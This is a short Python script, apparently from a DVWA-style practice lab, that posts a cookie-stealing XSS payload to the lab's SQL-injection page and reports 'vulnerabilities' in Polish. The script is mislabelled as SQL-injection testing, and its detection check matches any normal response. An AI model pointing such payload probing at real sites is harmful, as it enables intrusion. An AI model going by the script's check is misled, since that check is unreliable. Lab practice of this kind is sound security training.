import requests

base_url = "http://10.10.241.196"

payloads = [
   "<script>alert(document.cookie);</script>",
]

cookies = {
    'PHPSESSID': 'oum0iaoe530vblhijrh5gp3md7',
    'security': 'low'
}

def test_sql_injection(url):
    for payload in payloads:
        # Use POST method i and create payload as a part of request body
        full_url = f"{url}/vulnerabilities/sqli/"
        data = {'id': payload, 'Submit': 'Submit'}  # Form data

        print(f"Testing with payload: {payload}")

        try:
            response = requests.post(full_url, data=data, cookies=cookies)
            print(f"Response status code: {response.status_code}")

            if response.status_code == 200:
                print(f"Response text:\n{response.text}\n")

                
                if "First name" in response.text and "Surname" in response.text:
                    print(f"Podatność SQL Injection wykryta przy użyciu payloadu: {payload}")
                
            else:
                print(f"Nieoczekiwany kod statusu: {response.status_code}")

        except requests.exceptions.RequestException as e:
            print(f"Request Exception: {e}")

        print("---------------------------------------------------")


test_sql_injection(base_url)

